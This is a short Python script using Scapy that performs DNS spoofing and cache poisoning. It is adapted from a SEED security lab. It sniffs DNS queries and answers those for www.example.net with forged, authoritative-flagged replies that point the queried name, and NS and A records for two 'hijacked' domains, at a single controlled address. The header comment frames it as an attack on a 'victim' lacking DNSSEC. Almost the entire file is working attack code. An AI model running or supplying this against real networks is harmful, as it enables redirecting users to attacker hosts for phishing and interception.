#!/usr/bin/python
# Modified from - http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Networking/DNS_Local/DNS_Local.pdf
# If you suspect your victim doesn't have DNSSEC enabled, send them a link to www.example.net, 
# and run this script on the IP that is the authoritative name server for that domain. The script will reply
# back with the original answer plus also state it's authoritative the high jacked domains and send an A 
# record pointing back to itself. 

from scapy.all import *
def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='10.0.2.5')
        # The Authority Section
        NSsec1 = DNSRR(rrname='hijackeddomain1.com', type='NS',ttl=259200, rdata='10.0.2.5')
        NSsec2 = DNSRR(rrname='hijackeddomain2.com', type='NS',ttl=259200, rdata='10.0.2.5')
        # The Additional Section
        Addsec1 = DNSRR(rrname='www.hijackeddomain1.com', type='A', ttl=259200, rdata='10.0.2.5')
        Addsec2 = DNSRR(rrname='www.hijackeddomain2.com', type='A', ttl=259200, rdata='10.0.2.5')
        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2,an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        # Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
